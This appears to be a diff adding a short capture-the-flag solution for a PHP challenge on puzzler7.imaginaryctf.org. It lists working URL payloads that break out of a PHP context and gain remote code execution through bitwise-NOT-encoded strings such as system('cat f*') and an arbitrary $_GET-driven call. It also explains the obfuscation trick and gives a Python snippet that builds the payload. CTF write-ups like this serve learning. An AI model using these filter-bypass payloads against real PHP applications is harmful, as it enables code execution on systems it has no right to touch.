@@ -1,0 +1,23 @@
+Without RCE:
+http://puzzler7.imaginaryctf.org:5000/?escape=?%3E%3C?=${%27;@^]%27^%27],?:%27}?%3E  (ends with ?>)
+or
+http://puzzler7.imaginaryctf.org:5000/?escape=?%3E%3C?=${%27;@^]%27^%27],?:%27};  (ends with ;)
+
+Length limited RCE:
+http://puzzler7.imaginaryctf.org:5000/?escape=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%99%D5);  (system("cat f*");)
+http://puzzler7.imaginaryctf.org:5000/?escape=(~%8C%97%90%88%A0%8C%90%8A%8D%9C%9A)(~%99%D1%8F%97%8F);  (show_source("f.php");)
+
+Arbitrary RCE:
+http://puzzler7.imaginaryctf.org:5000//?_=system&%FF=ls&escape=%24%7B%24_%3D~%27%A0%B8%BA%AB%27%7D%5B_%5D%28%24%24_%5B%FF%5D%29%3B
+
+Basically, ~'\xa0\xb8\xba\xab' == '_GET'
+So ${~'\xa0\xb8\xba\xab'} is $_GET
+php 7 will only emit warning of the use of undefined constant, so _ === '_' and \x7f ~ \xff can be used as constant too.
+Get parameter "_" from url: ${$_=~'\xa0\xb8\xba\xab'}[_]
+Get parameter "%ff" from url: $$_[\xff]
+Call string as function: ${$_=~'\xa0\xb8\xba\xab'}[_]($$_[\xff]);
+
+generate the payload:
+
+from urllib.parse import quote
+quote(b"${$_=~'\xa0\xb8\xba\xab'}[_]($$_[\xff]);")
